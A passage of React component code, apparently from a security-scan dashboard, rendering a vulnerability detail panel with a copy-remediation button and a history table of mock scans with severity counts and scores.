                        className="btn-secondary"
                        onClick={() => {
                          navigator.clipboard?.writeText(`${selectedVuln.title}\n\nDescription:\n${selectedVuln.description}\n\nRemediation Steps:\n${selectedVuln.fix}`);
                          showToast('Remediation guide copied!');
                        }}
                        style={{ fontSize: '0.875rem' }}
                      >
                        Copy Implementation Guide
                      </button>
                    </div>
                  </div>
                ) : (
                  <div className={styles.vulnDetailEmpty}>
                    <p>Select a vulnerability to view details</p>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* HISTORY TAB */}
          {activeTab === 'history' && (
            <div className={styles.history}>
              <div className={styles.historyTable}>
                <div className={styles.tableHeader}>
                  <span>Target Asset</span>
                  <span>Assessment Date</span>
                  <span>Duration</span>
                  <span>Critical</span>
                  <span>High</span>
                  <span>Score</span>
                  <span>Action</span>
                </div>
                {MOCK_SCANS.map(scan => (
                  <div key={scan.id} className={styles.tableRow}>
                    <span className={styles.tableTarget}>{scan.target}</span>
                    <span className={styles.tableCell}>{scan.date}</span>
                    <span className={styles.tableCell}>{scan.duration}</span>
                    <span className={`badge badge-red`}>{scan.critical}</span>
                    <span className={`badge badge-orange`}>{scan.high}</span>
                    <span className={styles.tableScore} style={{ color: scoreColor(scan.score) }}>{scan.score}/100</span>
                    <button
                      className="btn-ghost"
                      style={{ fontSize: '0.8rem', padding: '6px 12px' }}
                      onClick={() => { setSelectedScan(scan); setActiveTab('findings'); }}
                    >
                      View Package →
                    </button>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
